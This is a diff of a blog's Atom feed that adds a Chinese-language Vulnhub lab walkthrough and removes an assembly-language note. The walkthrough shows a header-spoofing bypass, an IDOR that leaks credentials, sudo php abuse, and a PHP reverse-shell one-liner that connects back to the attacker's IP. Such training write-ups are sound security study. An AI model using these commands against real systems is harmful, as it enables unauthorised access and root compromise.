@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kn0sky.com/"/>
-  <updated>2020-05-17T10:13:47.000Z</updated>
+  <updated>2020-05-20T12:05:23.000Z</updated>
   <id>http://kn0sky.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【Vulnhub】Me And My Girlfriend--Workthourgh</title>
+    <link href="http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/"/>
+    <id>http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/</id>
+    <published>2020-05-20T08:06:19.000Z</published>
+    <updated>2020-05-20T12:05:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Vulnhub-Me-And-My-Girlfriend-1–Workthourgh"><a href="#Vulnhub-Me-And-My-Girlfriend-1–Workthourgh" class="headerlink" title="[Vulnhub]Me And My Girlfriend:1–Workthourgh"></a>[Vulnhub]Me And My Girlfriend:1–Workthourgh</h2><blockquote><p>文章作者：kn0sky</p><p>作者博客：kn0sky.com</p></blockquote><p>本来想下载新的靶机去玩的，无奈下载速度太慢，无意间发现去年下载的没打过的靶机，是个简单难度的，刚好挺久没练习了，有点生疏了拿来练练手，耗时：2小时</p><h3 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Date release: 13 Dec 2019</span><br><span class="line">Author: TW1C3</span><br><span class="line">Series: Me and My Girlfriend</span><br><span class="line"></span><br><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!</span><br><span class="line"></span><br><span class="line">Difficulty Level: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there are 2 flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br></pre></td></tr></table></figure><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/" target="_blank" rel="external nofollow noopener noreferrer">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p><h3 id="用到的知识-amp-工具"><a href="#用到的知识-amp-工具" class="headerlink" title="用到的知识&amp;工具"></a>用到的知识&amp;工具</h3><ul><li>nmap&amp;主机发现、端口扫描</li><li>burp&amp;修改请求包信息</li><li>sudo -l查看权限</li><li>php反弹shell</li></ul><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>攻击机的IP地址为192.168.101.5</p><p>靶机的IP地址为192.168.101.4</p><p>先端口扫描</p><p><img src="image-20200520163545755.png" alt="image-20200520163545755"></p><p>目标开放了22端口和80端口</p><p>查看80端口</p><p><img src="image-20200520164618303.png" alt="image-20200520164618303"></p><p>看起来像个提示，等会再说，先进行目录爆破看看，得到几个可以访问的地址</p><p><img src="image-20200520164704590.png" alt="image-20200520164704590"></p><p>在robots.txt文件里找到如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Allow: &#x2F;heyhoo.txt</span><br></pre></td></tr></table></figure><p>访问这个地址：</p><p><img src="image-20200520164822736.png" alt="image-20200520164822736"></p><p>看起来又是个提示</p><p>这个网站主页上说，网站只能从内部访问，这里猜测服务器通过IP地址来判断访问者来源，那么我们在访问请求中添加XFF头来试一试：<code>X-Forwarded-For:127.0.0.1</code></p><p><img src="image-20200520175517452.png" alt="image-20200520175517452"></p><p>网站成功跳转了（这里注意，每次发送请求都需要把XFF头加上）,成功进入网站主页：</p><p><img src="image-20200520175705133.png" alt="image-20200520175705133"></p><p>浏览一番发现，网站存在用户名密码泄露的问题，这里我们通过注册功能注册一个账号，然后登录进入，进入profile页面如下：</p><p><img src="image-20200520175929238.png" alt="image-20200520175929238"></p><p>在这个页面刷新，用Burp抓包，把抓到的包放到repeater模块中</p><p><img src="image-20200520180051559.png" alt="image-20200520180051559"></p><p>可以轻易发现，我们的账号密码在网页中是以明文保存的，这个时候我们修改请求中的user_id参数，可以发现，不同的user_id的值代表不同的用户信息（账号&amp;密码）</p><p>通过不断修改user_id的值我们可以得到如下用户名和密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eweuhtandingan:skuyatuh</span><br><span class="line">aingmaung:qwerty!!!</span><br><span class="line">sundatea:indONEsia</span><br><span class="line">sedihaingmah:cedihhihihi</span><br><span class="line">alice:4lic3</span><br></pre></td></tr></table></figure><p>拿到了目标Alice的账号密码，ssh登录服务器看看：</p><p><img src="image-20200520180431376.png" alt="image-20200520180431376"></p><p>登陆成功，且在<code>alice</code>的主目录下找到了<code>flag1</code></p><p>以及emmmm，alice不喜欢bob了？？？算了，管他呢</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ cat my_notes.txt </span><br><span class="line">Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes</span><br></pre></td></tr></table></figure><p>下一步是拿到root权限，先查看一下Alice账号的权限吧：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure><p>alice可以免密码使用root权限执行php命令，这就好办了，思路是通过root权限执行php反弹shell到攻击机上</p><p>先在攻击机上运行nc来监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@windows7:~<span class="comment"># nc -nvlp 7788</span></span><br><span class="line">listening on [any] 7788 ...</span><br></pre></td></tr></table></figure><p>然后使用alice 的账号运行php反弹shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ sudo php -r <span class="string">'$sock=fsockopen("192.168.101.5",7788);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>这个时候我们拿到了反弹的shell:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@windows7:~<span class="comment"># nc -nvlp 7788</span></span><br><span class="line">listening on [any] 7788 ...</span><br><span class="line">connect to [192.168.101.5] from (UNKNOWN) [192.168.101.4] 43264</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>既然已经提权到root了，直接去root目录找flag</p><p><img src="image-20200520182436014.png" alt="image-20200520182436014"></p><p>到此正式结束</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;Vulnhub-Me-And-My-Girlfriend-1–Workthourgh&quot;&gt;&lt;a href=&quot;#Vulnhub-Me-And-My-Girlfriend-1–Workthourgh&quot; class=&quot;headerlink&quot; title=&quot;[Vulnhub
+      
+    
+    </summary>
+    
+    
+      <category term="靶机笔记" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="vulnhub" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>逆向基础02--初试破解</title>
@@ -503,32 +529,6 @@
       
         &lt;h1 id=&quot;汇编基础09-–-传送指令&quot;&gt;&lt;a href=&quot;#汇编基础09-–-传送指令&quot; class=&quot;headerlink&quot; title=&quot;汇编基础09 – 传送指令&quot;&gt;&lt;/a&gt;汇编基础09 – 传送指令&lt;/h1&gt;&lt;p&gt;指令：MOVS&lt;/p&gt;
 &lt;p&gt;格式：MOVS OPR
-      
-    
-    </summary>
-    
-    
-      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-      <category term="汇编基础学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>汇编基础08： JCC 转移指令</title>
-    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8008--JCC%E6%8C%87%E4%BB%A4/"/>
-    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8008--JCC%E6%8C%87%E4%BB%A4/</id>
-    <published>2020-04-17T22:27:19.000Z</published>
-    <updated>2020-04-17T23:10:27.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="汇编基础08：-JCC-转移指令"><a href="#汇编基础08：-JCC-转移指令" class="headerlink" title="汇编基础08： JCC 转移指令"></a>汇编基础08： JCC 转移指令</h1><p>常用的<code>JCC</code>指令</p><ul><li><p><code>JMP</code>：无条件跳转</p></li><li><p><code>JZ/JE</code>：ZF =1,也就是比较结果=0[cmp通过相减的方式进行比较(相等)]时跳转</p></li><li><p><code>JNZ/JNE</code>：ZF =0，也就是比较结果≠0（不相等）时跳转</p></li><li><p><code>JBE/JNA</code>：CF=1/ZF=1  ，低于等于/不高于等于跳转(前面数小于等于后面数)</p></li><li><p><code>JNBE/JA</code>：CF=0/ZF=0  ，不低于等于/高于等于跳转（前面数大于等于后面数）</p></li><li><p><code>JL/JNGE</code>：SF!=OF  ，小于/不大于等于跳转</p></li><li><p><code>JNL/JGE</code>：SF=OF ,不小于/大于等于跳转</p></li></ul><blockquote><p>注意：</p><p>使用JCC指令的时候，前面不要跟影响标志位的指令</p><p>一般JCC和CMP指令一起用</p></blockquote><p>JCC指令表</p><p><img src="1.png" alt></p><p><img src="%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8008--JCC%E6%8C%87%E4%BB%A4/1.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;汇编基础08：-JCC-转移指令&quot;&gt;&lt;a href=&quot;#汇编基础08：-JCC-转移指令&quot; class=&quot;headerlink&quot; title=&quot;汇编基础08： JCC 转移指令&quot;&gt;&lt;/a&gt;汇编基础08： JCC 转移指令&lt;/h1&gt;&lt;p&gt;常用的&lt;code&gt;JCC&lt;/
       
     
     </summary>
